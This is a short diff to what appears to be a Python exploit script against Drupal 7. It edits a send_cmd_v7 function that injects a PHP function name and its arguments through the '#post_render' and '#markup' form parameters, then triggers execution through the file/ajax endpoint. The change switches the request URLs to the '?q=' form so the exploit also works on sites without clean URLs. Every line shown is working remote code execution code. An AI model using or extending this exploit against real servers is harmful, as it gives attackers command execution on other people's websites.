@@ -13,13 +13,13 @@ def post_data(path, data_dict):
 	return content
 
 def send_cmd_v7(site, php_fct, args):
-	url = site + '/user/password?name[%23post_render][0]=' + php_fct \
+	url = site + '?q=/user/password&name[%23post_render][0]=' + php_fct \
 		+ '&name[%23markup]=' + urllib.quote(args)
 	payload = { 'form_id' : 'user_pass', '_triggering_element_name' : 'name' }
 	rsp1 = post_data(url, payload)
 	clist = rsp1.split('"')
 	formb_id =  clist[ clist.index("form_build_id") + 2 ]
-	url2 = site + '/file/ajax/name/%23value/' + formb_id
+	url2 = site + '?q=/file/ajax/name/%23value/' + formb_id
 	payload2 = { 'form_build_id' : formb_id }
 	rsp2 = post_data(url2, payload2)
 	if rsp2[-1] != "]":
